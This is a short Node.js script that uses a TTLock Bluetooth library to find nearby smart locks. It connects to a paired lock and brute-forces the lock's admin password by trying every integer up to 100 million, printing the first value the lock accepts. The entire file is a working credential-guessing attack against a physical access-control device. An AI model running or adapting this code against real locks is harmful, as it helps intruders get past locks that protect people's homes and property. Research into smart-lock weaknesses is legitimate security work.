const { TTLockClient, sleep } = require("./dist");
const fs = require("fs/promises");
const settingsFile = "lockData.json";

async function doStuff() {
  let lockData = await require("./examples/common/loadData")(settingsFile);
  let options = require("./examples/common/options")(lockData);

  const client = new TTLockClient(options);
  await client.prepareBTService();
  client.startScanLock();
  console.log("Scan started");
  client.on("foundLock", async (lock) => {
    console.log(lock.toJSON());
    console.log();

    if (lock.isInitialized() && lock.isPaired()) {
      await lock.connect();
      for (let i of require("tqdm")(g(), { total: 100000000 })) {
        lock.privateData.admin.adminPs = i;
        try {
          await lock.checkAdminCommand();
          console.log(i);
          break;
        } catch {
          //ignore
        }
      }
      await lock.disconnect();

      // await require("./examples/common/saveData")(
      //   settingsFile,
      //   client.getLockData()
      // );

      process.exit(0);
    }
  });
}

doStuff();

function* g() {
  for (let i = 153000; i <= 100000000; i++) {
    // yield parseInt("e1736c" + i.toString(16).padStart(2, "0"), 16);
    yield i;
  }
}
